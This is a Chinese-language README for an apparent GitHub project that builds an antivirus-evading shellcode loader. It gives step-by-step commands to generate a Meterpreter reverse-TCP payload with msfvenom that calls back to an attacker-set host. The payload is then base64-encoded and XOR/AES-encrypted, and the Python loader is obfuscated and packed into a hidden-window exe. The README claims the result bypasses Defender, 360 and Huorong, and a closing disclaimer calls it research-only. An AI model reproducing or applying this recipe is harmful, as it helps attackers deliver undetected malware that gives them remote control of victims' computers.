# python-shellcode-loader

<a name="ptTMq"></a>
## 简单介绍
免杀方式 msfvenom生成raw格式的shellcode-->base64-->XOR-->AES<br />将python代码缩小并混淆最后生成exe<br />目前过DF、360和火绒  virustotal：7/66过卡巴斯基、迈克菲等
<a name="H2jnt"></a>
## 获取项目
git clone [https://github.com/HZzz2/python-shellcode-loader.git](https://github.com/HZzz2/python-shellcode-loader.git)<br />cd python-shellcode-loader
<a name="CuRMC"></a>
## 生成shellcode
#生成shellcode<br />`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=9999 -f raw > rev.raw`
<a name="rNUTI"></a>
## base64编码shellcode并替换jiami.py中的值
#base64<br />`base64 -w 0 -i rev.raw > rev.bs64`<br />`cat rev.bs64`<br />复制base64的值替换jiami.py中payload       也就是 第二十五行 sc='payload' 
<a name="uXwYU"></a>
## 加密base64并替换main.py中的值
#加密base64后的shellcode<br />`python3 jiami.py`<br />#会生成一个aes-xor.txt的文件，复制文件里的值(经过XOR和AES加密后)<br />复制的值替换main.py中的payload   也就是第四十一行 jiami_sc='payload'
<a name="RhzZp"></a>
## 缩小和混淆py代码
<a name="K5dP3"></a>
### 缩小python代码
`pyminify main.py --output main-mini.py`
<a name="PTqkf"></a>
### 混淆main-mini.py中的python代码
[https://pyob.oxyry.com/](https://pyob.oxyry.com/)  在线混淆<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/26697321/1654524591386-7385c972-05e4-4761-bac3-311ae4ab2b0c.png#clientId=ufd1019e1-55bc-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=531&id=u32a8913b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=664&originWidth=1919&originalType=binary&ratio=1&rotation=0&showTitle=false&size=192572&status=done&style=none&taskId=uf5d03036-4fc8-4141-aec3-77143fc268e&title=&width=1535.2)<br />将混淆后的代码保存到一个文件中，比如文件名为:main-mini-ob.py
<a name="s0SXj"></a>
## 打包成可执行文件exe
#打包成exe<br />`pyinstaller.exe -Fw -i .\setting.ico --key=leslie .\main-mini-ob.py`<br />-F 打包为单文件 -w 不显示窗口   -i ico图标文件  --key  加密字节码的密钥<br />等待打包完成。。。。<br />打包好后的可执行程序在dist目录中
<a name="dr6Hv"></a>
## 流程图
![](https://cdn.nlark.com/yuque/0/2022/jpeg/26697321/1654524239719-d5ff881a-602c-4508-81b8-8e14c0d41595.jpeg)
<a name="SyXYB"></a>
## 检测图
![](https://cdn.nlark.com/yuque/0/2022/png/26697321/1654525156343-d09e4ca2-cf34-4fd0-a214-8429d736233d.png#crop=0&crop=0&crop=1&crop=1&from=url&id=pOHgi&margin=%5Bobject%20Object%5D&originHeight=1017&originWidth=1286&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/26697321/1654525200953-17958e93-4b05-4571-b721-1fa0899cab6f.png#clientId=ufd1019e1-55bc-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=609&id=uc52334d8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=761&originWidth=1286&originalType=binary&ratio=1&rotation=0&showTitle=true&size=152617&status=done&style=none&taskId=uf646b4ab-a4ff-4915-ac9c-247f27f5b44&title=%E7%81%AB%E7%BB%92&width=1028.8 "火绒")<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/26697321/1654525256207-e8a9c46a-c6ed-4dbc-9b23-056590331f50.png#clientId=ufd1019e1-55bc-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=742&id=uba33cae1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=927&originWidth=1256&originalType=binary&ratio=1&rotation=0&showTitle=true&size=151849&status=done&style=none&taskId=ubcd89f76-ab00-4621-9849-4980386bb94&title=360%E6%9D%80%E6%AF%92&width=1004.8 "360杀毒")<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/26697321/1654525285242-8ab59c49-ba44-4a08-a61c-8553204b4c6b.png#clientId=ufd1019e1-55bc-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=658&id=uc0ddad1f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=823&originWidth=1260&originalType=binary&ratio=1&rotation=0&showTitle=true&size=199897&status=done&style=none&taskId=uf2de339b-8045-4277-af70-6d0879a609b&title=360%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB&width=1008 "360安全卫士")<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/26697321/1654525389400-740f14b8-a7d0-49ea-aa96-81f3326ca4aa.png#clientId=ufd1019e1-55bc-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=752&id=u509ce450&margin=%5Bobject%20Object%5D&name=image.png&originHeight=940&originWidth=1908&originalType=binary&ratio=1&rotation=0&showTitle=true&size=103618&status=done&style=none&taskId=ud3c698a7-1fc9-48f1-abdf-20d66f4def9&title=virustotal&width=1526.4 "virustotal")<br />[运行示例.mp4](https://www.yuque.com/attachments/yuque/0/2022/mp4/26697321/1654531695137-0d35f79f-8cbb-4d1c-96a3-ccef4744fb6b.mp4?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2022%2Fmp4%2F26697321%2F1654531695137-0d35f79f-8cbb-4d1c-96a3-ccef4744fb6b.mp4%22%2C%22name%22%3A%22%E8%BF%90%E8%A1%8C%E7%A4%BA%E4%BE%8B.mp4%22%2C%22size%22%3A9075464%2C%22type%22%3A%22video%2Fmp4%22%2C%22ext%22%3A%22mp4%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22u4f7e269d-9214-4e7e-9b21-dc642edf43e%22%2C%22taskType%22%3A%22upload%22%2C%22__spacing%22%3A%22both%22%2C%22id%22%3A%22uf2aa31d4%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22card%22%3A%22file%22%7D)
[![运行示例.mp4 (8.66MB)](https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ)]()<a name="w6pnE"></a>
## 免责声明
仅供安全研究与教学之用，如果使用者将其做其他用途，由使用者承担全部法律及连带责任，本人不承担任何法律及连带责任。











